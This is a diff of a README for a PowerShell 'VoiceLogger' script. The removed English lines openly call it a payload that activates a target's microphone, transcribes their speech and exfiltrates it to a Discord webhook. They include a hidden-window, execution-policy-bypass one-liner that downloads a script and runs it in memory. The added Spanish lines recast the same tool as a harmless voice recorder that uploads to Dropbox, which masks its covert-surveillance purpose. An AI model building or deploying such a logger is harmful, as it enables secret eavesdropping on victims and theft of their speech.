@@ -1,38 +1,69 @@
+# Script de Registro de Voz y Subida a Dropbox
 
+Este script de PowerShell graba audio durante un período de tiempo especificado, transcribe el audio en texto y luego sube el archivo de registro resultante a Dropbox.
 
-# VoiceLogger
+## Características
 
-## Description
+- Graba audio utilizando el dispositivo de audio predeterminado del sistema.
+- Transcribe el audio en texto.
+- Guarda la transcripción en un archivo de texto.
+- Sube el archivo de texto a Dropbox.
+- Elimina el archivo de registro local después de la subida.
 
-This payload activates your target's microphone, converts their speech to text, and exfils it to Discord 
-with the optional functionality of incorporating voice activated payloads.
+## Requisitos
 
-## Getting Started
+- PowerShell
+- Conexión a Internet
+- Token de API de Dropbox
+- Permisos para ejecutar scripts de PowerShell
+- Sistema con soporte para .NET y bibliotecas de reconocimiento de voz de Windows
 
-### Dependencies
+## Uso
 
-* Windows 10,11
+### Función DropBox-Upload
 
-### Executing program
+Esta función sube un archivo a Dropbox.
 
-* Plug in your device
-* Invoke-WebRequest will be entered in the Run Box to download and execute the script from memory
+#### Parámetros
 
-`$db` is the variable that stores your Discord webhook 
+- **RutaArchivoOrigen**: La ruta del archivo que se va a subir.
 
-```
-powershell -w h -NoP -Ep Bypass $dc='';irm  | iex
-```
+#### Ejemplo
 
-### The Function
+```powershell
+DropBox-Upload -RutaArchivoOrigen "C:\ruta\al\archivo.txt"
 
-- The voiceLogger function leverages the System.Speech namespace to create a continuous speech-to-text logger. 
-- It initializes a speech recognition engine, loads a dictation grammar, and sets the input to the default audio device. 
-- The script then enters an infinite loop where it listens for speech input and recognizes the text. 
-- The recognized text is written to the output and saved to a temporary log file. 
-- The log file content is then uploaded using the DC-Upload function. 
-- Additionally, the script checks for specific voice commands using a switch statement with regex patterns: if the word "notepad" is detected, it launches Notepad, 
-- and if the word "exit" is detected, it breaks the loop and stops the voice logger. 
-- Once the loop is terminated, the log file's content is cleared.
+Función voiceLogger
 
+Esta función graba audio, transcribe el audio en texto y guarda la transcripción en un archivo de texto. Luego sube el archivo a Dropbox.
+Parámetros
 
+    duracionMinutos: La duración en minutos de la grabación de audio (valor predeterminado: 5 minutos).
+
+Ejemplo
+
+powershell
+
+voiceLogger -duracionMinutos 5
+
+Instalación
+
+    Clona el repositorio:
+
+    bash
+
+    git clone https://github.com/tuusuario/registro-voz-dropbox.git
+    cd registro-voz-dropbox
+
+    Asegúrate de tener los permisos necesarios para ejecutar scripts de PowerShell en tu sistema.
+
+Detalles del Script
+
+El script incluye las siguientes funciones:
+
+    DropBox-Upload: Sube un archivo a Dropbox utilizando la API de Dropbox.
+    voiceLogger: Graba audio durante el tiempo especificado, transcribe el audio en texto y sube el archivo resultante a Dropbox.
+
+Nota
+
+Para que la función de subida a Dropbox funcione correctamente, asegúrate de configurar la variable de entorno db con tu token de API de Dropbox.
